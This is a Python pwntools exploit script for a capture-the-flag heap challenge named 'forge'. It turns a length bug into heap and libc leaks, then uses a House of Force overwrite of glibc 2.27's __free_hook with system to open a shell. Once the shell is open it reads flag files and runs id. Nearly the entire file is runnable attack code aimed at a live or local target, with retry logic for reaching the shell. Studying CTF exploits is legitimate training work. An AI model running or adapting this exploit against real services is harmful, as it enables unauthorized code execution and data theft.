#!/usr/bin/env python3
"""
forge - CSCTF 2026 pwn (450 pts)

    read_until_nl(p + strlen(p), notes[i].size);   // should be size - strlen(p)

`temper` appends at the end of the current string but still allows a FULL `size`
bytes, so a note filled to the brim writes straight through the top chunk's size
field. glibc 2.27 has no "top size sane?" check -> House of Force, exactly as the
source comment advertises.

  1. tcache leak   two 0x20 notes, free both, re-forge: the popped entry still holds
                   tcache->next, i.e. the other chunk's address  -> heap base
  2. unsorted leak a 0x500 note (too big for tcache) freed behind a guard chunk gets
                   fd/bk = main_arena; re-forge it and read them back  -> libc base
  3. HoF           fill the last note, temper 0xff over the top size, then ask for
                   (__free_hook - 0x10 - top) - 8 so the top chunk lands on
                   __free_hook - 0x10. The next forge returns __free_hook itself.
  4. shell         write `system` there, then melt the note holding "/bin/sh".
"""
import re
import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HERE  = os.path.dirname(os.path.abspath(__file__))
LOCAL = os.path.join(HERE, "work/forge_patched")
LIBC  = ELF(os.path.join(HERE, "dist/libc.so.6"), checksec=False)

TCACHE_STRUCT = 0x250      # glibc 2.27 tcache_perthread_struct chunk, first on the heap


class Desync(Exception):
    """an unlucky 0x0a in a pointer, or a leak cut short -- retry on a fresh connection"""


class Forge:
    def __init__(self, io):
        self.io = io

    def menu(self, choice):
        self.io.recvuntil(b"> ")
        self.io.sendline(b"%d" % choice)

    def _content(self, data, size):
        # read_until_nl stops at '\n' OR after `size` bytes; when we send exactly
        # `size` bytes the '\n' is never consumed, so it must not be sent
        if len(data) >= size:
            self.io.send(data[:size])
        else:
            self.io.send(data + b"\n")

    def forge(self, size, data=b""):
        self.menu(1)
        self.io.recvuntil(b"size> ")
        self.io.sendline(b"%d" % size)
        self.io.recvuntil(b"content> ")
        self._content(data, size)

    def temper(self, idx, data, size):
        self.menu(2)
        self.io.recvuntil(b"index> ")
        self.io.sendline(b"%d" % idx)
        self.io.recvuntil(b"more content> ")
        self._content(data, size)

    def inspect(self, idx):
        self.menu(3)
        self.io.recvuntil(b"index> ")
        self.io.sendline(b"%d" % idx)
        self.io.recvuntil(b"#%d: " % idx)
        return self.io.recvuntil(b"\n", drop=True)

    def melt(self, idx):
        self.menu(4)
        self.io.recvuntil(b"index> ")
        self.io.sendline(b"%d" % idx)


def attempt(connect):
    io = connect()
    f = Forge(io)
    io.recvuntil(b"=== THE FORGE ===")

    # -- 1. heap: tcache entry still points at the next chunk after it is popped --
    f.forge(0x18, b"A" * 8)          # slot 0 -> chunk A
    f.forge(0x18, b"B" * 8)          # slot 1 -> chunk B
    f.melt(0)                        # tcache[0x20]: A
    f.melt(1)                        # tcache[0x20]: B -> A
    f.forge(0x18, b"")               # slot 0 = chunk B, data[0:8] = &A
    leak = f.inspect(0)
    if len(leak) < 6:
        raise Desync("heap leak %d bytes" % len(leak))
    heap = u64(leak[:6].ljust(8, b"\x00")) - (TCACHE_STRUCT + 0x10)
    if heap & 0xfff:
        raise Desync("heap base %#x not page aligned" % heap)
    log.success("heap base = %#x" % heap)

    # -- 2. libc: a 0x510 chunk skips tcache, so free() leaves main_arena in fd/bk --
    f.forge(0x500, b"")              # slot 1  @ heap+0x290
    f.forge(0x88,  b"")              # slot 2  guard, keeps it off the top chunk
    f.melt(1)                        # -> unsorted bin
    f.forge(0x500, b"")              # slot 1 again, fd/bk left in place
    leak = f.inspect(1)
    if len(leak) < 6:
        raise Desync("libc leak %d bytes" % len(leak))
    main_arena = u64(leak[:6].ljust(8, b"\x00"))
    LIBC.address = main_arena - 0x3ebca0          # main_arena+0x60 in this libc
    if LIBC.address & 0xfff:
        raise Desync("libc base %#x not page aligned" % LIBC.address)
    log.success("libc base = %#x" % LIBC.address)

    free_hook = LIBC.sym["__free_hook"]
    system    = LIBC.sym["system"]

    # -- 3. House of Force -------------------------------------------------------
    f.forge(0x18, b"/bin/sh")        # slot 3 = chunk A off the tcache, NUL already there
    f.forge(0x18, b"A" * 0x18)       # slot 4, fresh off the top chunk, filled solid
    top = heap + 0x850
    log.info("top chunk = %#x" % top)

    # strlen now runs past the note into the top size field; temper appends there
    f.temper(4, b"\xff" * 0x18, 0x18)

    # __free_hook ends in 0x8 but every chunk is 16-aligned, so it can never BE the
    # returned pointer. Land the chunk 8 bytes earlier (on __after_morecore_hook,
    # which is 16-aligned) and write 16 bytes across both.
    target = free_hook - 8
    assert target % 16 == 0
    evil = (target - 0x10 - top - 8) % (1 << 64)
    f.forge(evil, b"")               # slot 5: moves the top chunk onto target-0x10

    payload = p64(0) + p64(system)[:6]   # __after_morecore_hook = 0, then system
    if b"\n" in payload:
        raise Desync("0x0a inside system -> read_until_nl would stop early")
    f.forge(0x18, payload)           # slot 6 == __after_morecore_hook
    log.success("__free_hook = %#x <- system %#x" % (free_hook, system))

    # -- 4. free("/bin/sh") ------------------------------------------------------
    f.melt(3)
    sleep(0.3)
    io.sendline(b"cat /flag* /home/*/flag* 2>/dev/null; echo ---; id")
    out = io.recvrepeat(2.0)
    if b"uid=" not in out:
        raise Desync("no shell on the wire")
    return io, out


def main():
    if len(sys.argv) > 1 and ":" in sys.argv[1]:
        host, port = sys.argv[1].rsplit(":", 1)
        connect = lambda: remote(host, int(port))
    else:
        connect = lambda: process(LOCAL)

    for i in range(4):
        try:
            io, out = attempt(connect)
            break
        except (Desync, EOFError) as e:
            log.warning("attempt %d failed: %s" % (i + 1, e))
    else:
        log.failure("no attempt reached a shell")
        return

    print(out.decode(errors="replace"))
    m = re.search(rb"CSCTF\{[^}]*\}", out)
    if m:
        log.success("FLAG: " + m.group(0).decode())
    else:
        io.interactive()


if __name__ == "__main__":
    main()
